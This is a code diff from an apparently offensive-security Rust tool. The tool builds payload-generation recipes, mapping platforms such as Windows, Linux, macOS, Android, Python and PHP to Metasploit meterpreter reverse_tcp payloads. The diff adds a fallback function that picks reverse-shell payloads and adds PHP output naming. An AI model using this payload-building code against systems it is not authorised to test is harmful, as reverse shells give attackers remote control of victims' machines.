@@ -23,7 +23,7 @@ pub const PLATFORM_PAYLOADS: &[(&str, &[(&str, &str)])] = &[
         ],
     ),
     ("android", &[("dalvik", "android/meterpreter/reverse_tcp")]),
-    ("python", &[("python", "python/meterpreter/reverse_tcp")]),
+    ("python", &[("py", "python/meterpreter/reverse_tcp")]),
     ("php", &[("php", "php/meterpreter/reverse_tcp")]),
 ];
 
@@ -48,7 +48,10 @@ pub fn build_recipe(
                 .find(|(known_arch, _)| *known_arch == arch_lower)
                 .map(|(_, payload)| (*payload).to_string())
         })
-        .unwrap_or_else(|| format!("{}/{}/meterpreter/reverse_tcp", platform_lower, arch_lower));
+        // Fallback for known platforms: use the first available payload
+        .unwrap_or_else(|| {
+            platform_fallback_payload(&platform_lower, &arch_lower)
+        });
 
     let format = match platform_lower.as_str() {
         "windows" => "exe",
@@ -63,6 +66,8 @@ pub fn build_recipe(
     let output_file = if format == "raw" {
         if platform_lower == "python" {
             format!("{}.py", output_path)
+        } else if platform_lower == "php" {
+            format!("{}.php", output_path)
         } else {
             format!("{}.{}", output_path, format)
         }
@@ -105,6 +110,25 @@ pub fn build_recipe(
         iterations,
         command,
     }
+}
+
+fn platform_fallback_payload(platform: &str, arch: &str) -> String {
+    match platform {
+        "windows" => match arch {
+            "x64" => "windows/x64/meterpreter/reverse_tcp",
+            _ => "windows/meterpreter/reverse_tcp",
+        },
+        "linux" => match arch {
+            "x64" => "linux/x64/meterpreter/reverse_tcp",
+            _ => "linux/x86/meterpreter/reverse_tcp",
+        },
+        "macos" => "osx/x64/meterpreter/reverse_tcp",
+        "android" => "android/meterpreter/reverse_tcp",
+        "python" => "python/meterpreter/reverse_tcp",
+        "php" => "php/meterpreter/reverse_tcp",
+        _ => "generic/shell_reverse_tcp",
+    }
+    .to_string()
 }
 
 pub fn get_available_platforms() -> Vec<String> {
